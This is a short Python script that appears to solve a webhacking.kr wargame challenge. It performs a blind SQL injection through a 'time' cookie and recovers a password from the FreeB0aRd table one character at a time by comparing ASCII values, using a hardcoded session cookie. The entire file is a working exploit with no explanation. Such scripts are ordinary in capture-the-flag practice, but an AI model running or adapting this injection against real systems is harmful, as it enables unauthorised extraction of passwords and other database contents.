import requests
import re


url = 'http://webhacking.kr/challenge/web/web-02/index.php'

cmp = "09:00:01"


dbname= ""

#Password is
for i in range(1, 10):
    for j in range(40,125):
        query = "1487676946 and (select  ascii(substr(password," + str(i) + ",1))=" + str(j) + " from FreeB0aRd)"
        cookie = {'PHPSESSID': 'bd1ab4e28a5aaa3629bd9cf232d62759','time':query}
        req = requests.get(url, cookies=cookie)
        res=req.text
        tmp = re.findall(cmp, res)
        if tmp:
            dbname += chr(j)
            break
print "Password is : " + dbname
        
